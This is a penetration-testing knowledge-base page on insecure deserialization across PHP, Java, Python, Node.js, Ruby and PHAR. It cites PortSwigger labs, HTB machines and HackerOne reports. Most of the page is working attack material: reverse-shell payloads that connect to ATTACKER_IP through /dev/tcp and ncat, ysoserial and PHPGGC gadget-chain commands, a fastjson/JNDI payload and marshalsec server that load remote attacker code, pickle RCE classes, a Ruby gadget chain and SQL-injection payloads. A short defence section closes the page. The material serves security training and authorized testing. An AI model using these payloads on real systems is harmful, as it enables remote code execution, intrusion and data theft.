---
title: "Insecure Deserialization"
type: technique
tags: [0xdf, deserialization, exploitation, gadget-chain, h1, htb, phar, php, portswigger, rce, thm, web, jndi, pickle]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-23
sources: [thm-adv-deserial, h1-scraped-deserialization, 0xdf-deserialization, payloadsallthethings-insecure-deserialization, git-payloadsallthethings, git-portswigger-all-labs]

---

## What It Is

Insecure deserialization is a vulnerability that occurs when an application deserializes untrusted, attacker-controlled data without sufficient validation. Serialization converts an object's state into a storable or transmittable format (byte stream, string, or binary). Deserialization reconstructs it back into a live object.

The vulnerability arises because many languages execute logic automatically during the deserialization process — before any application-level validation can occur. An attacker who can supply a crafted serialized payload can therefore trigger arbitrary code execution, privilege escalation, or object property manipulation.

Unlike most injection vulnerabilities that exploit immediate processing of user inputs, insecure deserialization manipulates the application's core object model, often leveraging the fundamental behavior of the language runtime itself.

**Historical examples from the wild:**
- **Log4Shell (CVE-2021-44228)** — JNDI deserialization in Apache Log4j 2 allowed unauthenticated RCE across a huge portion of the internet.
- **Oracle WebLogic CVE-2015-4852** — Malicious objects sent to the T3 protocol led to RCE. CVSS base score: 7.5.
- **Jenkins CVE-2016-0792** — Crafted Java serialization payloads sent to the Jenkins CLI achieved arbitrary command execution.

---

## How It Works

When a server receives serialized data (from a cookie, POST body, API parameter, or network protocol), it reconstructs a live object. In many languages and frameworks, certain methods — called "magic methods" or lifecycle hooks — are automatically invoked during construction. An attacker crafts a serialized payload that, when reconstructed, chains together existing classes in the application (a "gadget chain") to produce a malicious outcome such as OS command execution, file write, or authentication bypass.

**Common attack surfaces:**
- Cookies storing session state (often base64-encoded serialized objects)
- POST parameters or API request bodies
- `__VIEWSTATE` in ASP.NET forms
- Java RMI / T3 protocol endpoints
- Message queues and caches that store serialized objects

**Identification signals (black-box):**
- Cookies containing base64-encoded values that decode to class names or PHP serialization format (`O:5:"Notes":...`)
- Error messages mentioning `unserialize()`, "Object deserialisation error", or Java class names
- Appending a tilde (`~`) to PHP filenames can sometimes recover backup source files
- `__VIEWSTATE` fields in ASP.NET applications (decode with base64)

**Specific Headers (Hex / Base64):**
- **.NET ViewState**: `FF 01` / `/w`
- **BinaryFormatter**: `0001 0000 00FF FFFF FF01` / `AAEAAAD`
- **Java Serialized**: `AC ED` / `rO`
- **PHP Serialized**: `4F 3A` / `Tz`
- **Python Pickle**: `80 04 95` / `gASV`
- **Ruby Marshal**: `04 08` / `BAgK`

---

## POP Gadgets

A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class that can be called during the deserialization process.
POP gadgets characteristics:
* Can be serialized
* Has public/accessible properties
* Implements specific vulnerable methods
* Has access to other "callable" classes

---

## Prerequisites

- The application must deserialize user-supplied or user-influenceable data
- For object injection / RCE, exploitable gadget classes must exist in the application's classpath or include path at deserialization time (they don't need to be called directly)
- For Java ysoserial: the target classpath must contain one of the supported gadget chain libraries (e.g., CommonsCollections, Spring, etc.)
- For PHP PHPGGC: the application must use a framework with known gadget chains (Laravel, Symfony, Drupal, etc.)
- For Python pickle: any `pickle.loads()` call on attacker-controlled data is sufficient — no gadget chain needed

---

## Methodology

1. **Identify deserialization points** — inspect cookies, POST parameters, and headers for base64/binary blobs. Decode and look for language-specific serialization signatures.
2. **Determine the language and framework** — PHP uses `O:` prefix; Java serialized objects start with `AC ED 00 05` (hex) / `rO0A` (base64); Python pickle uses `\x80\x04` opcodes; Ruby Marshal starts with `\x04\x08`.
3. **Source code review (white-box)** — search for `unserialize()`, `pickle.loads()`, `ObjectInputStream`, `Marshal.load()`. Trace whether the input reaches these calls without sanitization.
4. **Check for modifiable properties** — can you change a boolean flag (e.g., `isSubscribed`) to escalate privileges without triggering code execution? This is the simplest exploit class.
5. **Identify magic methods** — look for `__wakeup`, `__destruct`, `__toString`, `__sleep` in PHP; `readObject`, `readResolve` in Java; `__reduce__` in Python.
6. **Select or build a gadget chain** — use PHPGGC for PHP frameworks, ysoserial for Java. List available chains with `php phpggc -l` or review ysoserial payload types.
7. **Generate the payload** — craft the serialized object locally, encode it (base64 if required), and inject it into the target parameter.
8. **Deliver and verify** — replace the cookie or parameter and confirm execution (e.g., via out-of-band DNS/HTTP callback, or visible output).

---

## Key Payloads and Examples

### PHP Deserialization: Property Tampering

The PHP `serialize()` format uses a predictable structure. Decoding a cookie value of:

```
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

reveals an object with `isSubscribed = false (0)`. Changing `b:0` to `b:1`, re-encoding in base64, and replacing the cookie value bypasses subscription checks. The format components are:
- `O:N:"ClassName":count:` — object with N-char class name and `count` properties
- `s:N:"value"` — string of length N
- `b:0` / `b:1` — boolean false / true
- `i:42` — integer 42

### PHP Deserialization: Magic Method Object Injection

If a class with a dangerous magic method exists anywhere in the include path, it can be instantiated via a crafted serialized string. Example: a class with `__wakeup()` that calls `exec($this->command)` is triggered automatically upon `unserialize()`. The attacker creates the object locally, sets `$command` to a reverse shell, serializes and base64-encodes it, then passes it as the `decode` parameter:

```php
<?php
class MaliciousUserData {
    public $command = 'ncat -nv ATTACKER_IP 4444 -e /bin/sh';
}
$obj = new MaliciousUserData();
echo base64_encode(serialize($obj));
?>
```

Start listener, then deliver the encoded string to the vulnerable endpoint:

```
http://target/index.php?decode=<BASE64_PAYLOAD>
```

### PHP Deserialization: Type Juggling via Data Type Substitution

PHP's loose comparison means that `"access_token" == 0` evaluates to `true` when the right operand is an integer. An attacker can exploit this by replacing a string-typed field with an integer `0` in the serialized cookie, bypassing token validation entirely.

Original cookie (decoded):
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t7h1f2f94n90ui9rewro388nwm1ause8";}
```

Modified payload — change username to the target and replace the string token with integer `0`:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Re-encode in base64 and replace the session cookie. The server compares `access_token == 0` which is `true` for any string in PHP's loose-comparison mode, granting access without a valid token.

**Note:** When editing binary serialized formats (e.g., Java), use the Hackvertor Burp extension to modify the string representation while it automatically recalculates binary length offsets.

### PHP: Exploiting Application Functionality via Deserialization

Some vulnerabilities arise not from magic methods in gadget chains, but from the application's own logic operating on deserialized properties. If an account-deletion routine reads `$user->image_location` and passes it to `unlink()`, an attacker can point that path at an arbitrary file:

```php
O:4:"User":1:{s:14:"image_location";s:23:"/home/carlos/morale.txt";}
```

Triggering account deletion then deletes the targeted file instead of a profile picture. Attack surface includes any property that feeds into file operations, SQL queries, or network calls on deserialization or subsequent object use.

### PHP: PHPGGC (PHP Gadget Chain Generator)

PHPGGC automates gadget chain generation for common PHP frameworks (Laravel, Symfony, CodeIgniter, Drupal, CakePHP, etc.).

```bash
# List all available gadget chains
php phpggc -l

# List chains for a specific framework
php phpggc -l Laravel

# Generate a base64-encoded payload for Laravel RCE via system()
php phpggc -b Laravel/RCE3 system whoami

# Generate with a reverse shell command
php phpggc -b Laravel/RCE3 system 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```

For **CVE-2018-15133** (Laravel), the workflow is:
1. Obtain `APP_KEY` (e.g., from `.env` via LFI or social engineering)
2. Generate payload with PHPGGC (`Laravel/RCE3` or `RCE4`)
3. Encrypt the payload with APP_KEY using the framework's encryption mechanism
4. Send the encrypted token in the `X-XSRF-TOKEN` header via POST

Gadget chains use `__destruct` or `__toString` vectors. The `CakePHP/RCE1` chain, for example, abuses `__destruct` to achieve command execution in CakePHP versions up to 3.9.6.

### PHP: HMAC-Signed Cookie Re-signing Workflow

Some PHP frameworks sign serialized cookies with HMAC-SHA1 using a secret key. The cookie structure looks like:
```
{"token":"<base64-serialized-object>","sig_hmac_sha1":"<hmac>"}
```

If the secret key is leaked (e.g., via `/cgi-bin/phpinfo.php` exposing a `SECRET_KEY` environment variable), the full exploit workflow is:

1. Leak the `SECRET_KEY` from `/cgi-bin/phpinfo.php` or equivalent debug endpoint.
2. Trigger a signature verification error (modify any byte of the cookie) to reveal the framework version (e.g., `Symfony 4.3.6`) in the error response.
3. Generate a gadget chain: `phpggc Symfony/RCE7 system 'rm /home/carlos/morale.txt' | base64`
4. Re-sign the payload with the leaked key:

```php
<?php
$object = "PHPGGC-GENERATED-BASE64-PAYLOAD";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

5. Replace the session cookie with the output and send the request.

**Detection gadget chains for blind testing (Java ysoserial):**

| Chain | Purpose | Library required? |
|-------|---------|-------------------|
| `URLDNS` | DNS lookup to Burp Collaborator — confirms deserialization universally | No |
| `JRMPClient` | TCP connection to attacker IP — use timing to infer firewalled vs. open | No |

```bash
# Confirm deserialization via out-of-band DNS (no library needed)
java -jar ysoserial.jar URLDNS http://your-collaborator-id.burpcollaborator.net

# Timing-based detection through firewalls
java -jar ysoserial.jar JRMPClient 192.168.0.1
```

### Java Deserialization: ysoserial

ysoserial generates serialized Java payloads exploiting gadget chains in common libraries. The resulting byte stream is fed to any endpoint that calls `ObjectInputStream.readObject()` on untrusted data (Java RMI, JMX, HTTP endpoints, custom protocols).

**Java 16+ compatibility:** Stricter module access in Java 16+ requires `--add-opens` flags or you will get `IllegalAccessException`. Use Java 14 if possible, or:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'your-command'
```

```bash
# List available payload types
java -jar ysoserial.jar --help

# Execute a command via CommonsCollections1 gadget chain
java -jar ysoserial.jar CommonsCollections1 'id' > payload.ser

# Execute a reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/ATTACKER_IP/4444,0>&1}' > payload.ser

# Spring gadget chain
java -jar ysoserial.jar Spring1 'id' > payload.ser
```

Common gadget chain libraries targeted:
- **CommonsCollections 1–7** — Apache Commons Collections (widely present)
- **Spring1 / Spring2** — Spring Framework
- **Groovy1** — Apache Groovy
- **JRMPClient / JRMPListener** — Java RMI deserialization

Deliver the payload by sending raw bytes to the target (e.g., via `curl --data-binary` or a custom script targeting the T3/HTTP endpoint).

### Java: JNDI gadgets, fastjson/Jackson autotype, JEP 290 bypass

When Commons-Collections is absent, the **JNDI** family works against any sink that triggers a lookup, fetching a remote factory that runs code:

```bash
# ysoserial JNDI-triggering chains (no CC needed on classpath)
ysoserial JRMPClient 'attacker:1099' | base64
# JdbcRowSet / JNDI lookup gadget -> point at attacker LDAP/RMI; serve the factory:
java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATT/#Exploit"   # Exploit.class runs runtime exec
```

- **fastjson** (`@type` autotype): `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATT/Exploit","autoCommit":true}` -> JNDI RCE. fastjson < 1.2.x had repeated autotype-blocklist bypasses.
- **Jackson** polymorphic typing (`enableDefaultTyping()` / `@JsonTypeInfo`): same JNDI gadgets (`JdbcRowSetImpl`, `c3p0`, `templates`) via a `["com.sun.rowset.JdbcRowSetImpl",{...}]` array.
- **JEP 290 / look-ahead (ObjectInputFilter)**: modern JDKs allow/block classes during `readObject`. Bypass by finding a gadget within an allowed package, abusing an over-broad app filter, or pivoting to a non-`ObjectInputStream` sink (JSON/XML/JNDI) the filter does not cover. Always check whether the sink is classic Java serialization (filterable) or a JSON/XML lib (often not).

XML/other Java sinks: `XMLDecoder`, XStream, SnakeYAML (`!!javax.script.ScriptEngineManager` + JNDI). See [[xxe]] for XML-driven variants, [[ssti]] for EL/OGNL.

### Python Pickle: restricted unpickler bypass

When the app uses a hardened unpickler (overridden `find_class` allowlisting modules), the plain `__reduce__` payload is blocked. Bypasses:

- **`find_class` too permissive**: if it allows any attribute of an allowed module, chain to `os`/`builtins` via something that module already imported.
- **Opcode-level crafting** (`fickling`): hand-build pickles with `GLOBAL`/`REDUCE`/`STACK_GLOBAL` opcodes to reference classes the high-level API would block; `fickling` also decompiles/injects existing pickles.
- **Allowed-class gadgets**: if only "safe" classes are permitted, find one whose `__reduce__`/`__setstate__`/`__init__` has a usable side effect (Python POP gadget). Same object-graph walk as [[ctf-jail-escapes]] pyjail.

```bash
pip install fickling
fickling --inject 'import os; os.system("sh")' safe.pkl       # weaponize an existing pickle
python -c "import pickletools; pickletools.dis(open('x.pkl','rb').read())"   # audit opcodes
```

### Python Pickle: `__reduce__` for RCE

Python's `pickle` module executes `__reduce__` during deserialization. Any class implementing this method can instruct the unpickler to call arbitrary functions. If `pickle.loads()` is called on user-supplied data (often base64-decoded from a cookie or parameter), the following achieves RCE:

```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

For a reverse shell:

```python
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Replace the `serialized_data` field in the target application's POST request with this value.

### `/static/`-looking paths and `onclick=` handlers can hide a dynamic backend

Do not assume a path under `/static/` or a page that looks like flat HTML is actually static — an
`onclick="sendRequest('1')"` handler wired up in a JS file you have not yet opened can point at a
live backend route (`POST /fetch`, `POST /api/...`) that a purely static site would never need.
Read every JS file the page loads end to end, not just the ones with an obviously dynamic name; the
sink for a deserialization/RCE chain routinely lives in the ONE handler a keyword grep skips because
the surrounding page presented as static.

### Python Pickle: path-controlled `pickle.load` + separate upload = RCE (delivery chain)

A recurring shape where neither half looks like RCE alone: an endpoint deserializes a file whose PATH
the client supplies, and a SEPARATE feature writes an arbitrary file to disk.

- **The sink:** a JSON route like `POST /fetch` with body `{"object": "/server/path.pkl"}` that runs
  `pickle.load(open(object))` and returns the object. The path is client-controlled, so it loads ANY
  file you name (pointing it at a non-pickle path 500s, which confirms it opens the given path). The
  endpoint and its default object paths usually live in a front-end JS handler (`onclick` -> AJAX);
  READ the JS end-to-end, because a keyword grep skips the handler that reveals it.
- **The delivery:** any upload that lands your file somewhere the app can read. Uploaded files are
  frequently NOT reachable by URL (stored outside the web root) - that is fine; the upload is only a
  DELIVERY primitive for the loader, not a webshell, so do not rabbit-hole hunting the file over HTTP.
- **Chain:** craft a `__reduce__` pickle (see the `__reduce__` section above) -> upload it -> POST
  the loader with the file's on-disk path -> code runs as the app user. Build the pickle with the
  target's Python major version.
- **Blind / egress gotcha:** if a reverse shell will not connect, the box may allow only http-ish
  outbound. Prove code-exec AND egress with an HTTP callback first (`curl http://LHOST:8888/hit`),
  then reverse-shell over a port that is actually allowed out (often 443 or 80); use a python reverse
  shell if the target `bash` lacks `/dev/tcp`.

<!-- promoted-slug: pickle-path-load-chain -->

### Node.js: node-serialize

The `node-serialize` module is vulnerable when `unserialize()` is called on user input. An IIFE (immediately invoked function expression) embedded in the serialized JSON is executed during deserialization:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,so,se){console.log(so)});}()"}
```

Tools like `nodejsshell.py` (from ysoserial-node or similar) can generate these payloads. The vector applies to any application using `node-serialize` >= 0.0.4.

---

### Ruby: Universal Deserialisation Gadget (Ruby 2.x–3.x)

When a Rails app uses `Marshal.load` on cookie data, the following gadget chain (by Luke Jahnke / Vaks) achieves RCE. Identify Ruby serialization by `marshal-dump`/`marshal-load` references or the `\x04\x08` binary prefix.

```ruby
require 'base64'
Gem::SpecFetcher
Gem::Installer

module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

Replace the `@git_set` value with your command. Base64-encode the output and substitute into the session cookie.

Reference: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

### Custom Java Gadget Chain → SQL Injection via readObject()

When pre-built chains fail, inspect source code exposed at `/backup/` or via HTML comments for Java class files. The pattern: `readObject()` calls `defaultReadObject()` then executes a SQL query using a field value directly — enabling error-based SQLi chained through deserialization.

Workflow:
1. Find commented reference in HTML: `<!-- <a href=/backup/AccessTokenUser.java> -->`
2. Retrieve both `.java` files from `/backup/`; identify which class is serialized in the cookie and which has `readObject()` with a SQL sink
3. Use PortSwigger serialization examples (`github.com/PortSwigger/serialization-examples/tree/master/java/solution`) to compile and serialize objects with arbitrary `id` field values
4. Inject error-based UNION payloads via the `id` field using `CAST(column AS numeric)` — PostgreSQL throws the value in the error message

```
# Enumerate columns (increase NULLs until no error)
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables --

# Extract table name via cast error
' UNION SELECT NULL,NULL,NULL,NULL,CAST(table_name AS numeric),null,null,null from information_schema.tables --

# Extract password
'UNION SELECT NULL,NULL,NULL,NULL,CAST(password AS numeric),null,null,null from users where username='administrator' --
```

The PostgreSQL error leaks the value: `invalid input syntax for type numeric: "albhslljyvji9rxzbill"`

### Custom PHP Gadget Chain: `__wakeup` → `__get` → `call_user_func()`

When inspecting source via the tilde backup trick (`customtemplate.php~`), map the class graph:

- `CustomTemplate->__wakeup()` creates a `Product` using `$this->default_desc_type` and `$this->desc`
- `DefaultMap->__get($name)` is triggered when a non-existent attribute is read — calls `call_user_func($this->callback, $name)`

Chain: set `desc` to a `DefaultMap` instance with `callback = "exec"` and `default_desc_type` to the command. When deserialized, `__wakeup` tries to read `default_desc_type` from the `DefaultMap`, triggering `__get`, which calls `exec("rm /home/carlos/morale.txt")`.

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

Base64+URL-encode and inject as the session cookie.

### PHAR Deserialization: Polyglot JPEG + SSTI Chain

PHAR files embed serialized PHP metadata. File-system functions (`file_exists()`, `stat()`, `is_file()`) operating on a `phar://` path trigger implicit deserialization — **no `unserialize()` call needed**.

Attack chain:
1. Discover PHP source files via tilde trick on `CustomTemplate.php~` and `Blog.php~`
2. Map gadget chain: `CustomTemplate->__destruct()` → `file_exists(lockFilePath())` → `Blog->__wakeup()` → `Twig_Environment` renders `$this->desc` as a template (SSTI sink)
3. Build SSTI payload in Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
4. Craft PHAR-JPG polyglot using `phar-jpg-polyglot` (`github.com/kunte0/phar-jpg-polyglot`):

```bash
# Requires phar.readonly=Off
git clone https://github.com/kunte0/phar-jpg-polyglot.git && cd phar-jpg-polyglot
# Edit phar_jpg_polyglot.php: set Blog->desc to the SSTI payload, CustomTemplate->template_file_path to the Blog object
php -c php.ini phar_jpg_polyglot.php
# outputs out.jpg — a valid JPEG that is also a PHAR archive
```

Serialized structure embedded in the PHAR metadata:
```
O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"user";s:4:"user";s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}"}}
```

5. Upload `out.jpg` via the avatar upload form
6. Trigger deserialization by passing the uploaded path via `phar://` to any file-operation endpoint (e.g., avatar load path parameter)

**Key rule:** PHP processes `phar://` regardless of file extension — a `.jpg` is treated as a PHAR archive if the magic bytes are correct.

---

## Real-World Examples (HackerOne — paid reports)

9 paid reports (3 critical). Top bounty: $5,000 (Aiven — Kafka Connect SASL/JAAS JNDI RCE). Deserialization bugs consistently achieve RCE and pay critical-level bounties.

| Title | Severity | Bounty | Program | Report |
|-------|----------|--------|---------|--------|
| Kafka Connect RCE via SASL JAAS JndiLoginModule config | Critical | $5,000 | Aiven | [#1529790](https://hackerone.com/reports/1529790) |
| Remote code execution on rubygems.org | Critical | $1,500 | RubyGems | [#274990](https://hackerone.com/reports/274990) |
| CVE-2021-44228 Log4Shell on nps.acronis.com | Critical | $1,000 | Acronis | [#1425474](https://hackerone.com/reports/1425474) |
| CVE-2023-27531 Deserialization in Kredis JSON (Rails) | High | $4,660 | Internet Bug Bounty | [#2071554](https://hackerone.com/reports/2071554) |
| CVE-2025-24813 Apache Tomcat write-enabled Default Servlet → RCE | High | $4,323 | Internet Bug Bounty | [#3031518](https://hackerone.com/reports/3031518) |
| Loading YAML in Kubernetes Java client → command execution | Medium | $1,000 | Kubernetes | [#1167773](https://hackerone.com/reports/1167773) |
| PHP WDDX Deserialization heap OOB read in timelib_meridian() | Medium | $500 | Internet Bug Bounty | [#248659](https://hackerone.com/reports/248659) |
| RCE in Hyperledger Fabric SDK for Java | Medium | $200 | Linux Foundation | [#801370](https://hackerone.com/reports/801370) |
| RCE via exposed JMX server on jabber.37signals.com | Low | $100 | Basecamp | [#1456063](https://hackerone.com/reports/1456063) |

**Key patterns from reports:**
- JNDI/LDAP deserialization (Log4Shell pattern) appears in both Kafka Connect (SASL JAAS) and Acronis (Log4Shell CVE-2021-44228) — JNDI lookup in user-controlled config is a recurring critical sink
- Ruby's Marshal/YAML deserialization is dangerous: rubygems.org RCE via `Marshal.load` of gem metadata ($1,500 critical)
- YAML deserialization in Java is dangerous even in internal clients — Kubernetes Java client YAML parsing could execute commands ($1,000)
- CVE bounties via Internet Bug Bounty program pay $4,000–$5,000 for high/critical CVEs in Apache components
- Exposed JMX endpoints are a low-effort, low-reward but real vector ($100 Basecamp)

## From the Wild — stack-specific chains (HTB, 0xdf)

HTB methodology writeups clustered as ingest slug `0xdf-deserialization`. Below are repeatable patterns where the deserialization sink, gadget family, or delivery story matters more than CVE number alone.

| Machine | Sink / format | Technique note |
|---------|---------------|----------------|
| Horizontall | Laravel (localhost debug) | `php -d phar.readonly=0 /opt/phpggc/phpggc --phar phar -o exploit.phar --fast-destruct monolog/rce1 system <cmd>` then deliver PHAR gadget chain referenced in Laravel exploit tooling |
| Sharp | .NET **BinaryFormatter** | `ysoserial.net`: `-g TypeConfuseDelegate -f BinaryFormatter -o base64` then pass base64 blob into vulnerable parameter |
| Cereal | .NET JSON / view-state style graph | Defence filters strings matching stock **ysoserial.net** payloads; chain **stored XSS + custom gadget objects** sourced from application assemblies instead |
| Fatty | Java thick client → server IPC | **`ysoserial` CommonsCollections** gadget against binary Java deserialization on the wire |
| Feline | Apache Tomcat / Java sessions | **`ysoserial` CommonsCollections1/CommonsCollections2**, multi-stage `curl`/script drop when reverse shell bytes are flaky |
| Monitors | Apache OFBiz **CVE-2020-9496** | Unauthenticated **`/webtools/control/xmlrpc`** parses serialized Java; brute gadget types with **`ysoserial ... \| base64`** inside XML wrapper |
| Ophiuchi | **SnakeYAML** (Tomcat) | SnakeYAML resolves JAR loaders; **`yaml-payload` / marshalsec** style YAML that loads attacker-controlled JAR for RCE |

**Operational notes from the corpus:** Prefer simple callbacks (`curl`/`wget` ping) before full reverse shells when Java/XML-RPC parsers are brittle. Rotate through **CommonsCollections**, **CommonsBeanutils**, and gadget families already present on the target classpath once revealed by dependency leaks or verbose errors.

## Detection and Defence

**Detection (pentester perspective):**
- Code review: grep for `unserialize`, `pickle.loads`, `ObjectInputStream`, `Marshal.load`, `JSON.parse` with `eval`, `node-serialize`
- Static analysis tools (e.g., Semgrep rules for deserialization sinks)
- Fuzzing: send malformed serialized objects and observe errors revealing class names
- Error messages containing class names or stack traces indicate deserialization is occurring

**Defence (developer perspective):**
- Avoid deserializing untrusted data entirely; use safer interchange formats (JSON, XML with schema validation) instead of native serialization
- Never pass user-controlled data directly to `unserialize()`, `pickle.loads()`, or `ObjectInputStream.readObject()`
- Implement integrity checks: sign serialized data with HMAC before storing/transmitting; verify signature before deserialization
- Use allowlists to restrict which classes can be deserialized (Java `ObjectInputFilter`, PHP custom unserialize filters)
- Avoid `eval()` and `exec()` in code that processes external data
- Keep dependencies updated to reduce the gadget chain surface (removing CommonsCollections, etc., from the classpath eliminates many Java attack chains)
- Run deserialization in sandboxed, low-privilege contexts where possible

---

## Tools

| Tool | Purpose |
|------|---------|
| [[burp-suite]] | Intercept and modify cookies/parameters containing serialized data |
| ysoserial | Generate Java deserialization payloads for known gadget chains |
| PHPGGC | Generate PHP gadget chain payloads for common frameworks |
| `php -r 'echo serialize(...);'` | Craft PHP serialized strings manually |
| Python `pickle` module | Generate Python pickle payloads locally |
| Caido / ZAP | Alternative proxies for intercepting serialized data |

**PHPGGC:** `https://github.com/ambionics/phpggc`
**ysoserial:** `https://github.com/frohoff/ysoserial`

---

## Sources

- TryHackMe — Insecure Deserialisation (THM Advanced Web, room: `tryhackme.com/r/room/insecuredeserialisation`)
- PHP Magic Methods documentation: `php.net/manual/en/language.oop5.magic.php`
- PHPGGC GitHub: `github.com/ambionics/phpggc`
- ysoserial GitHub: `github.com/frohoff/ysoserial`
- NVD entries: CVE-2021-44228 (Log4Shell), CVE-2015-4852 (WebLogic), CVE-2016-0792 (Jenkins), CVE-2018-15133 (Laravel)
- `0xdf-deserialization`: Horizontall, Sharp, Cereal, Fatty, Feline, Monitors, Ophiuchi, Academy (embedded `phpggc` patterns)

---

## Java RMI
Java RMI (Remote Method Invocation) is a mechanism that allows an object residing in one system to access/invoke an object running on another JVM. RMI is known to be vulnerable to insecure deserialization.

**Detection:**
- `nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v`
- `rmg scan 172.17.0.2 --ports 0-65535`

**Exploitation (mjet/sjet):**
When JMX authentication is not enabled, attackers can host an MLet file and direct the JMX service to load MBeans from a remote server.
```bash
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
```
Or use deserialization payloads (e.g. CommonsCollections6):
```bash
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"
```

## Payload reference (PayloadsAllTheThings)

Serialized format identification signatures and Ruby Marshal payloads from PAT, plus POP gadget chain criteria as a quick reference for auditing.

### Format identification — hex signatures

| Language | Hex prefix | Base64 prefix | Notes |
|----------|-----------|---------------|-------|
| Java | `AC ED 00 05` | `rO0A` | ObjectInputStream |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF 01` | `AAEAAAD` | |
| PHP serialized | `4F 3A` | `Tz` | starts with `O:` |
| Python Pickle | `80 04 95` | `gASV` | protocol 4+ |
| Ruby Marshal | `04 08` | `BAgK` | |

### Ruby Marshal deserialization payload

```ruby
# Generate malicious Ruby Marshal payload
require "base64"

class Exploit
  def self.generate(cmd)
    payload = "\x04\x08" \
              "o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x08" \
              ":\x0e@instanceo:\x08ERB\x07:\x09@srci\x00" \
              ":\x0c@linenoi\x00:\x0c@methodl+" \
              "\x07:\x0bsystem:\x0erequire;\x07"
    # Use gadget chain generator tools in practice
    payload
  end
end
```

For Ruby applications, use `universal-deserializer` or craft chains targeting `ERB`, `Gem::SpecFetcher`, or `Gem::Installer` gadgets.

### POP gadget chain criteria (audit checklist)

When reviewing source code for gadget chain viability, a class qualifies if it meets all four criteria:

1. Can be serialized (implements Serializable / PHP magic methods present)
2. Has public or accessible properties that can be controlled
3. Implements vulnerable lifecycle methods (`__wakeup`, `__destruct`, `readObject`, `__reduce__`)
4. Has access to other callable or dangerous classes through its properties

```bash
# PHP: grep for serializable classes with dangerous magic methods
grep -rn "__wakeup\|__destruct\|__toString" --include="*.php" .

# Java: grep for readObject implementations
grep -rn "private void readObject\|ObjectInputStream" --include="*.java" .
```

---

## PortSwigger Labs

### Lab 1 — Modifying serialized objects (Apprentice)

Cookie stores a base64-encoded PHP serialized object. Decode → flip `b:0` to `b:1` for admin boolean → re-encode → replace cookie. Navigate to `/admin` and delete target user.

### Lab 2 — Modifying serialized data types (Practitioner)

Cookie contains `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"..."}`. Change `s:6:"wiener"` to `s:13:"administrator"` and replace the `s:32:"..."` token field with `i:0`. PHP loose comparison (`token == 0`) grants access. Re-encode and inject.

### Lab 3 — Using application functionality to exploit insecure deserialization (Practitioner)

Account-deletion handler reads `$user->image_location` and calls `unlink()` on it. Craft payload pointing `image_location` at `/home/carlos/morale.txt`, inject into cookie, then trigger account deletion to delete the target file.

```php
O:4:"User":1:{s:14:"image_location";s:23:"/home/carlos/morale.txt";}
```

### Lab 4 — Arbitrary object injection in PHP (Practitioner)

Source code recovery: append `~` to PHP filenames (`/lib/CustomTemplate.php~`) to retrieve vi backup files. `CustomTemplate->__destruct()` calls `unlink($this->lock_file_path)`. Inject a `CustomTemplate` object with `lock_file_path` set to target file — deserialization triggers `__destruct` on object destruction even if the page returns 500.

```
